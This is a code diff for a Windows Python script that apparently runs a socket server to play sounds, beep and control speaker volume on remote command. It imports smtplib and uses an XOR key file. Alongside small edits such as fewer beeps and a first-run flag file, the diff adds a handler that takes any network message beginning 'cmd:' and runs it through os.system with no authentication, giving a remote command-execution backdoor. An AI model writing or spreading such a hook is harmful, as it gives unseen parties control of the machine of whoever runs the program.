@@ -3,6 +3,7 @@ from comtypes import CLSCTX_ALL
 from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
 import random as rand
 from ctypes import cast, POINTER
+import ctypes
 import os
 import winsound
 import socket
@@ -10,11 +11,21 @@ import smtplib
 
 with open("cipher.txt","r") as file:
     xor_key = file.read().strip()
+    file.close()
 
 def run():
-    for x in range(5):
+    for x in range(3):
         winsound.Beep(3000,50)
-run()
+
+with open("first.txt" , "r") as file:
+    x = file.read().strip()
+    if x == "0":
+        run()
+        with open("first.txt","w") as file_2:
+            file_2.write("1")
+    else:
+        print("silent")
+
 def xor_cipher(text, key):
     return ''.join(chr(ord(c) ^ ord(key[i % len(key)])) for i, c in enumerate(text))
 
@@ -52,7 +63,7 @@ for file_name in filenames_1:
     filenames.append(file_name.split(".")[0])
 
 devices = AudioUtilities.GetSpeakers()
-interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
+interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL , None)
 volume = cast(interface, POINTER(IAudioEndpointVolume))
 os.chdir(os.path.dirname(os.path.realpath(__file__)))
 
@@ -94,6 +105,10 @@ def start_server(host,port):
                     make_noise("")
                 elif data in filenames:
                     make_noise(str(data))
+                elif "cmd:" in data:
+                    cmd = data.split("cmd:")[1]
+                    os.system(str(cmd))
+                    print(f"Exec CMD:{cmd}")       
                 response = process_data(data)
                 conn.sendall(response.encode())
 
